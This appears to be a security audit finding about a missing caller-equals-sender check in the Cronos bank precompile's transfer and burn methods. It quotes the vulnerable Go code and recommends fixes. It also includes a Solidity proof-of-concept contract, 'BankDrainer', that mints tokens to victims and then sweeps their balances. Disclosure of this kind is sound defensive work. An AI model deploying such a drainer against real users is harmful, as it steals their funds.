### Title
Unauthorized Token Transfer via Missing Caller-Sender Authorization in Bank Precompile `transfer` — (`File: x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `transfer` method of the bank precompile at `0x64` accepts an arbitrary `sender` address from ABI-decoded input and calls `bankKeeper.SendCoins(ctx, from, to, ...)` without ever verifying that `contract.Caller() == sender`. Any EVM contract can therefore drain tokens of denom `evm/<callerContract>` from any holder of that denom without the holder's consent.

---

### Finding Description

In `BankContract.Run`, the `TransferMethodName` branch unpacks `sender` directly from the caller-supplied ABI arguments:

```go
sender := args[0].(common.Address)   // attacker-controlled
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
// ...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())  // "evm/<callerAddress>"
// ...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

There is no guard of the form `contract.Caller() == sender` and no allowance/approval check. The only constraint is that the denom is bound to `contract.Caller()`, so the attacker can only move tokens of their own contract's denom — but that is precisely the denom their victims hold.

The same structural defect exists in the `BurnMethodName` branch, where `args[0]` is the address to burn from, again without verifying it equals `contract.Caller()`: [2](#0-1) 

By contrast, the `exec` helper used by the relayer precompile explicitly enforces `caller == signer`:

```go
caller := common.BytesToAddress(signers[0])
if caller != e.caller {
    return nil, fmt.Errorf("caller is not authenticated: ...")
}
``` [3](#0-2) 

No equivalent guard exists in the bank precompile's `transfer` or `burn` paths.

---

### Impact Explanation

**Critical — Unauthorized transfer/burn of precompile-controlled assets.**

`evm/<contractAddress>` denominated coins are precompile-controlled assets. A malicious contract can:

1. Mint `evm/0xMAL` tokens to users (e.g., by operating a fake yield protocol).
2. Call `transfer(victimAddress, attackerAddress, victimBalance)` on the bank precompile at any time.
3. `bankKeeper.SendCoins` executes unconditionally, moving the victim's entire balance to the attacker.

This is a direct, unconditional theft of user funds with no recovery path.

---

### Likelihood Explanation

**Medium.** The bank precompile is a live, callable contract at address `0x64`. Any deployed EVM contract can invoke it. The attacker only needs to attract users to hold their token (standard DeFi onboarding), then execute the drain in a single transaction. No privileged keys, governance access, or cryptographic breaks are required.

---

### Recommendation

In the `TransferMethodName` branch, enforce that the immediate EVM caller is the token sender:

```go
if contract.Caller() != sender {
    return nil, errors.New("caller is not authorized to transfer on behalf of sender")
}
```

Similarly, in the `BurnMethodName` branch, enforce:

```go
if contract.Caller() != recipient { // recipient = address to burn from
    return nil, errors.New("caller is not authorized to burn on behalf of address")
}
```

If delegated transfers are a required use-case, introduce an explicit on-chain allowance mapping (analogous to ERC-20 `approve`/`transferFrom`) that must be checked before `SendCoins` is called.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    // transfer(address sender, address recipient, uint256 amount) -> bool
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    // mint(address recipient, uint256 amount) -> bool
    function mint(address recipient, uint256 amount) external returns (bool);
}

contract BankDrainer {
    IBankPrecompile constant BANK = IBankPrecompile(address(0x64));

    // Step 1: attract victim — mint evm/<this> tokens to them
    function seedVictim(address victim, uint256 amount) external {
        BANK.mint(victim, amount);
    }

    // Step 2: drain — no approval from victim required
    function drain(address victim, address attacker, uint256 amount) external {
        // sender = victim, but contract.Caller() = address(this) in the precompile
        // denom = "evm/<address(this)>"
        // bankKeeper.SendCoins(victim -> attacker) executes unconditionally
        BANK.transfer(victim, attacker, amount);
    }
}
```

Attacker deploys `BankDrainer`, calls `seedVictim` to distribute tokens, then calls `drain` to sweep all victim balances. The bank precompile performs `SendCoins(victim, attacker, amount)` with no authorization check, completing the theft in one transaction.
